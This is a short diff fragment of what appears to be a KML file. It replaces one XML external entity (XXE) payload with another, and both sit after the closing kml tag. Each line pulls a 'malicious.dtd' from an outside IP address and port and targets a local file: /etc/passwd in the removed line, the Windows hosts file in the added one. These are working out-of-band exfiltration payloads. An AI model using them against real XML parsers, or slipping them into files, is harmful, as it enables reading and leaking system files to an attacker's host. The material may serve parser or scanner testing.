@@ -913,4 +913,4 @@ Simple Tables:<br>
     </Folder>
   </Document>
 </kml>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://142.188.72.162:40659/malicious.dtd?ext=file:///etc/passwd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://142.188.72.162:40659/malicious.dtd?ext=file:///C/windows/system32/drivers/etc/hosts"> %xxe;]>
